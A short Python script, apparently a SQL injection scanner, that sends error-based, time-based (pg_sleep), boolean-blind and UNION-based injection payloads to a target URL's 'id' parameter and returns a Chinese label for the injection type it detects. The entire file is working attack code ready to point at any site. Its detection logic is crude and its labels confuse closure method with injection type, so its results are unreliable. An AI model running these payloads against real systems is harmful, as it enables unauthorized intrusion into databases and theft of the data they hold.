
# test_bihe.py

import requests

def error_based_injection(url):
    payload = "1';SELECT * FROM non_existent_table--"
    response = requests.get(url + "?id=" + payload)
    if response.status_code == 500:
        return True
    else:
        return False

def time_based_injection(url):
    payload = "1';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--"
    response = requests.get(url + "?id=" + payload)
    if response.elapsed.total_seconds() > 10:
        return True
    else:
        return False

def boolean_blind_injection(url):
    payload = "1' AND 1=1--"
    true_response = requests.get(url + "?id=" + payload)
    true_content = true_response.content

    payload = "1' AND 1=2--"
    false_response = requests.get(url + "?id=" + payload)
    false_content = false_response.content

    if true_content == false_content:
        return False
    else:
        return True

def union_based_injection(url):
    payload = "1' UNION SELECT 1,2,3--"
    response = requests.get(url + "?id=" + payload)
    if "2" in response.text:
        return True
    else:
        return False

def bihefangshi(url):
    if error_based_injection(url):
        return "报错注入的闭合方式"
    elif time_based_injection(url):
        return "时间注入的闭合方式"
    elif boolean_blind_injection(url):
        return "布尔盲注的闭合方式"
    elif union_based_injection(url):
        return "联合注入的闭合方式"
    else:
        return "未知的闭合方式"
